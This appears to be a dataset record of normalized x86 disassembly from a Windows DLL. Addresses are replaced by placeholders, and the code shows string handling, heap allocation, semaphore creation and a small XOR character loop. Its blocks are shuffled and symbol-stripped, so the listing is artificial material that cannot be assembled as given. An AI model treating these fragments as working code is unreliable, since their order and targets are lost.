push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1002141a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
sub_1000b910
push ebp
mov ebp esp
push 0xffffffff
push sub_100828d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x68 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x60 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ edi ] ecx
lea ecx [ edi + 0x4 ]
mov [ ebp - 0x54 ] eax
xor ebx ebx
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] ax
mov eax edx
lea esi [ eax + 0x2 ]
mov [ ebp - 0x6c ] edi
mov [ ebp - 0x5c ] esi
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax [ ebp - 0x5c ]
sar eax 0x1
push eax
push edx
call sub_100531b0
mov eax [ ebp - 0x4c ]
lea ecx [ edi + 0x20 ]
mov [ ebp - 0x4 ] ebx
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
mov [ ecx ] dx
lea edx [ eax + 0x2 ]
mov si [ eax ]
add eax 0x2
cmp si bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ ebp - 0x4c ]
push eax
call sub_100531b0
mov cx [ ebp + 0xc ]
mov esi [ ebp - 0x68 ]
mov dl [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax esi
mov [ edi + 0x3c ] cx
mov [ edi + 0x3e ] dl
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea ecx [ eax + 0x2 ]
lea ebx [ ebx ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_100531b0
mov edx [ ebp - 0x64 ]
lea ecx [ ebp - 0x2c ]
push ecx
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x2
call sub_10030dc0
push eax
lea esi [ edi + 0x40 ]
mov edx r--data
mov [ ebp - 0x4 ] 0x3
call sub_10030dc0
add esp 0x8
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov esi 0x7
xor eax eax
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] ax
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
push 0xffffffff
lea ecx [ edi + 0x5c ]
mov [ ebp - 0x2c ] dx
mov edx [ ebp - 0x58 ]
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] ebx
mov [ ecx ] ax
call sub_10019180
mov edx [ ebp - 0x50 ]
push 0xffffffff
lea ecx [ edi + 0x78 ]
mov [ ebp - 0x4 ] 0x7
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_10019180
mov edx [ ebp - 0x60 ]
push 0xffffffff
lea ecx [ edi + 0x94 ]
mov [ ebp - 0x4 ] 0x8
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_10019180
mov edx [ ebp - 0x54 ]
push 0xffffffff
lea ecx [ edi + 0xb0 ]
mov [ ebp - 0x4 ] 0x9
push ebx
xor eax eax
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] ax
call sub_10019180
mov eax [ ebp + 0x2c ]
mov ecx [ ebp + 0x30 ]
mov [ edi + 0xcc ] eax
mov [ edi + 0xd0 ] ecx
mov [ edi + 0xd4 ] bx
mov [ edi + 0xd6 ] bl
mov [ edi + 0xd8 ] ebx
mov [ edi + 0xdc ] ebx
mov [ edi + 0xe0 ] ebx
mov [ edi + 0xe4 ] 0x3
mov [ edi + 0xe8 ] ebx
mov [ edi + 0xec ] ebx
mov [ edi + 0xf0 ] ebx
mov [ edi + 0xf4 ] ebx
mov [ edi + 0xf8 ] ebx
mov [ ebp - 0x4 ] 0xb
mov ecx edi
mov [ edi + 0x100 ] ebx
mov [ edi + 0x104 ] 0xd
mov [ edi + 0x108 ] 0xf
mov [ edi + 0x10c ] 0x32
call sub_1002cee0
mov eax [ edi + 0xf0 ]
cmp eax [ edi + 0xf4 ]
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1006591f
add esp 0x4
push ebx
push esi
push esi
push ebx
call [ CreateSemaphoreW@IAT ]
mov [ edi + 0xe8 ] eax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x2c
mov edx [ edi + 0x100 ]
lea esp [ esp ]
add eax 0x1c
cmp eax [ edi + 0xf4 ]
jne r-xdata
mov edx ecx
mov [ edi + 0x100 ] edx
mov ecx [ eax + 0x10 ]
cmp ecx edx
jbe r-xdata
sub_1000bbf0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebx + 0xb8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] 0x4
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
push ecx
push 0x20000005
mov [ esi ] 0x0
mov eax [ ebx + 0xdc ]
push edx
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax 0x64
mov esp ebp
pop ebp
retn 0x4
push 0x400
push 0x8
mov [ ebp - 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ edi ] eax
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push 0x400
add ecx eax
mov eax [ ebx + 0xe0 ]
push ecx
push edx
call eax
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push eax
mov [ edi ] eax
mov eax [ ebx + 0xe0 ]
push edx
call eax
mov ecx [ ebp - 0x4 ]
cmp ecx [ esi ]
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
lea esp [ esp ]
mov eax 0x5
mov esp ebp
pop ebp
retn 0x4
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax 0x6
mov esp ebp
pop ebp
retn 0x4
add [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
add eax 0x400
push eax
push ecx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
mov [ edi ] eax
add eax [ esi ]
mov edx [ ebx + 0xe0 ]
push 0x400
push eax
push ecx
call edx
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_1000bd19
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_1000bd70
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x128 ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x38 ]
mov eax 0xc4
call sub_100050e0
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_1003f7d0
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
sub_1000bddb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp ebx edi
jae r-xdata
mov eax [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx ebx
cmp ecx eax
ja r-xdata
push r--data
call sub_10050437
test eax eax
je r-xdata
push r--data
call sub_1002c5ed
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add ebx eax
push 0x0
push ebx
mov ecx esi
call sub_100399e0
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
push edx
add eax edi
add eax [ ebp + 0xc ]
add ecx edi
push ecx
push eax
call sub_10078db0
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push edi
call sub_1003f5e0
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] ebx
jb r-xdata
mov [ eax + ebx ] 0x0
sub_1000be80
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x90 ] edi
call sub_10051bd0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
mov [ ebp - 0x7c ] ebx
mov ecx [ eax ]
push esi
push eax
mov eax [ ecx + 0xdc ]
call eax
push esi
mov edi eax
call [ LocalFree@IAT ]
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea edx [ ebp - 0x80 ]
mov [ ebp - 0x80 ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x80 ]
cmp eax ebx
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ ebp - 0x8c ] ecx
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xe0
call sub_100050e0
jmp r-xdata
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
lea esi [ ebp - 0x84 ]
push esi
mov [ ebp - 0x84 ] ebx
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x1c ]
call eax
mov edi [ ebp - 0x84 ]
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x12f
lea ecx [ ebp - 0x88 ]
push ecx
mov [ ebp - 0x88 ] ebx
call sub_10047940
mov esi [ ebp - 0x88 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x8c ]
inc ecx
mov [ ebp - 0x8c ] ecx
cmp ecx [ ebp - 0x80 ]
jl r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ ebp - 0x90 ]
push esi
add eax 0x12c
call sub_1004bb20
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x84 ]
cmp eax ebx
je r-xdata
mov eax esi
call sub_100542e0
push esi
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xe7
jmp r-xdata
call sub_10018920
call sub_100050e0
sub_1000c010
push ebp
mov ebp esp
push 0xffffffff
push sub_10082288
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
xor eax eax
mov [ ebp - 0x38 ] ax
mov eax edi
mov [ ebp - 0x24 ] 0x7
mov [ ebp - 0x28 ] esi
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_100531b0
mov [ ebp - 0x4 ] esi
mov edx [ ebp - 0x24 ]
mov esi [ ebp - 0x38 ]
mov ecx esi
cmp edx 0x8
jae r-xdata
mov eax esi
jmp r-xdata
lea ecx [ ebp - 0x38 ]
mov eax ecx
mov ebx [ ebp - 0x28 ]
lea ebx [ eax + ebx * 2 ]
mov eax esi
cmp edx 0x8
jae r-xdata
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
push ecx
lea ecx [ ebp - 0x3c ]
push ecx
call sub_10029c70
add esp 0x8
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
lea eax [ ebp - 0x1c ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ ebp - 0x38 ]
push edx
call sub_10024610
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov eax edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
cmp [ ebp - 0x24 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
lea ecx [ ebp - 0x38 ]
call sub_100531b0
mov ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x38 ]
mov eax ecx
cmp ebx 0x8
jae r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x38 ]
push eax
call sub_1006591f
add esp 0x4
cmp [ eax ] 0x22
mov eax ecx
jne r-xdata
lea eax [ ebp - 0x38 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp ebx 0x8
jae r-xdata
cmp ebx 0x8
jae r-xdata
lea esi [ esi + esi + 0x8 ]
push esi
push eax
push edi
call sub_100796a0
add esp 0xc
xor edx edx
mov [ esi + edi ] dx
lea eax [ ebp - 0x38 ]
lea esi [ esi + esi + 0x6 ]
push esi
add eax 0x2
push eax
push edi
call sub_100796a0
add esp 0xc
xor ecx ecx
mov [ esi + edi ] cx
jmp r-xdata
lea eax [ ebp - 0x38 ]
xor eax eax
mov eax [ ebp - 0x38 ]
push eax
call sub_1006591f
add esp 0x4
cmp ebx 0x8
jb r-xdata
sub_1000c1ce
push 0x194
mov eax sub_1007fef3
call sub_1001bb6b
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x18 ]
and [ ebp - 0x168 ] 0x0
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x188 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18c ] ecx
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x190 ] ebx
mov ecx ebx
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10030b33
pop ecx
lea ecx [ ebp - 0x19c ]
lea eax [ ebp - 0x194 ]
push eax
call sub_100688a0
and [ ebp - 0x4 ] 0x0
push eax
call sub_100018ed
pop ecx
lea ecx [ ebp - 0x194 ]
jmp r-xdata
mov ecx [ ebp - 0x180 ]
cmp ecx 0x4
jae r-xdata
mov [ ebp - 0x174 ] eax
call sub_10069ce0
and [ ebp - 0x38 ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x161 ] 0x0
mov [ ebp - 0x16d ] 0x0
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x48 ] ax
and [ ebp - 0x54 ] eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
lea edx [ ebp - 0x198 ]
push edx
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x24 ]
and [ ebp - 0x180 ] 0x0
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
movsx eax [ ebp + ecx - 0x198 ]
sub eax 0x20
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1005721e
jmp r-xdata
cmp [ ebp - 0x38 ] 0x1
jbe r-xdata
cmp ecx 0x3
je r-xdata
sub eax 0x4
je r-xdata
mov ecx [ ebp - 0x188 ]
lea eax [ ebp - 0x64 ]
push eax
call sub_1002722c
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1000aecf
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000aecf
mov eax [ ebp - 0x188 ]
call sub_1004fa89
retn 0x14
cmp [ ebp - 0x16d ] 0x0
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
inc [ ebp - 0x180 ]
cmp [ ebp - 0x161 ] 0x0
je r-xdata
lea eax [ ebp - 0x1a0 ]
push eax
mov ecx ebx
call sub_100688a0
push eax
mov [ ebp - 0x4 ] 0xd
call sub_10033ef0
pop ecx
lea ecx [ ebp - 0x1a0 ]
mov edi eax
mov [ ebp - 0x4 ] 0x3
call sub_10069ce0
jmp r-xdata
mov ecx [ ebp - 0x174 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10028071
test [ ebx + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x4
jne r-xdata
sub eax edi
je r-xdata
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
movzx eax ax
push eax
push 0x1
push 0x0
lea ecx [ ebp - 0x64 ]
call sub_1000edbc
mov edi eax
lea eax [ ebp - 0x48 ]
mov ebx [ ebp - 0x190 ]
push 0x7
pop edi
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x180 ] 0x3
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
sub eax 0x4b
je r-xdata
mov ecx [ ebp - 0x38 ]
add edi 0x2
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x38 ] 0x1
ja r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ebx [ ebp - 0x174 ]
lea eax [ ebp - 0x128 ]
push eax
mov ecx ebx
call sub_1004ff82
or [ ebp - 0x168 ] 0x1
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x5
jbe r-xdata
mov ebx [ ebp - 0x174 ]
mov eax [ ebx ]
xor edi edi
mov ecx ebx
mov [ ebp - 0x17c ] edi
call [ eax + 0x1c ]
mov [ ebp - 0x184 ] eax
mov eax [ ebp - 0x18c ]
add eax 0x8
push eax
push edi
push 0x30
call sub_1003088d
movzx eax ax
mov [ ebp - 0x178 ] eax
add esp 0xc
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10051f6c
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x70 ] edi
je r-xdata
dec eax
dec eax
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
movzx eax [ esi + 0x6 ]
mov edx [ edi ]
push eax
push 0x48
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
mov ecx esi
call sub_10023e65
mov edi eax
jmp r-xdata
lea eax [ ebp - 0x2c ]
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
mov [ ebp - 0x16e ] 0x0
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_1004ff82
or [ ebp - 0x168 ] 0x2
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx ebx ax
cmp bx di
je r-xdata
mov ecx [ ebp - 0x38 ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x4 ] al
jne r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x16c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
push 0xffffffff
push 0x0
lea ecx [ ebp - 0x2c ]
call sub_1005721e
cmp [ esi + 0x4 ] al
jne r-xdata
cmp ax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x2c ]
test [ ebp - 0x168 ] 0x1
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffffd
push 0x0
push 0x1
lea ecx [ ebp - 0xf0 ]
call sub_1000aecf
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x174 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push [ ebp - 0x16c ]
mov ecx esi
movzx edi ax
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x6c ] 0x10
mov eax [ ebp - 0x80 ]
jae r-xdata
mov ax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x16e ] 0x0
je r-xdata
and [ ebp - 0x168 ] 0xfffffffe
push 0x0
push 0x1
lea ecx [ ebp - 0x128 ]
call sub_1000aecf
movzx eax [ esi + 0x6 ]
mov [ ebp - 0x16e ] 0x1
cmp [ edi ] ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
test di di
je r-xdata
cmp [ eax ] 0x7f
jae r-xdata
lea eax [ ebp - 0x80 ]
mov ecx esi
call sub_1005576a
jmp r-xdata
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
lea eax [ eax + ecx * 2 ]
cmp edi eax
je r-xdata
lea eax [ ebp - 0x2c ]
cmp ax [ ecx ]
je r-xdata
lea ecx [ ebp - 0x2c ]
lea eax [ ebp - 0xd4 ]
push eax
mov ecx ebx
call sub_100202c4
or [ ebp - 0x168 ] 0x4
cmp [ eax + 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x8
jbe r-xdata
mov ecx esi
call sub_1005576a
lea eax [ ebp - 0x160 ]
push eax
mov ecx ebx
call sub_1004ff82
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x7
call sub_10003a04
lea ecx [ ebp - 0x160 ]
jmp r-xdata
test [ ebp - 0x168 ] 0x2
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x184 ]
cmp [ ebp - 0x17c ] edi
jge r-xdata
mov [ ebp - 0x161 ] 0x1
jmp r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10006560
push [ ebp - 0x16c ]
mov ecx esi
mov [ ebp - 0x4 ] 0xc
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
xor bl bl
lea eax [ ebp - 0x144 ]
push eax
mov ecx ebx
call sub_100202c4
or [ ebp - 0x168 ] 0x8
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x9
jb r-xdata
push 0x0
push 0x1
mov [ ebp - 0x4 ] 0x3
call sub_1000aecf
jmp r-xdata
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_10023e65
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x3
call sub_10041a20
jmp r-xdata
sub edi [ ebp - 0x17c ]
movzx eax [ esi + 0x6 ]
cmp ax di
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x6c ] 0x10
mov edx [ ebp - 0x80 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ edi ]
jne r-xdata
mov ecx esi
call sub_10023e65
test [ ebp - 0x168 ] 0x4
mov [ ebp - 0x4 ] 0x3
je r-xdata
and [ ebp - 0x168 ] 0xfffffff7
push 0x0
push 0x1
lea ecx [ ebp - 0x144 ]
call sub_1000aecf
mov edi eax
mov edi [ eax ]
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push [ ebp - 0x178 ]
lea ecx [ ebp - 0x64 ]
push 0x1
call sub_100550c4
dec edi
jne r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x161 ] 0x0
jne r-xdata
lea edx [ ebp - 0x80 ]
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
add edi 0x2
call sub_1005576a
test bl bl
je r-xdata
and [ ebp - 0x168 ] 0xfffffffb
push 0x0
push 0x1
lea ecx [ ebp - 0xd4 ]
call sub_1000aecf
movzx eax [ esi + 0x6 ]
cmp [ edi ] ax
jne r-xdata
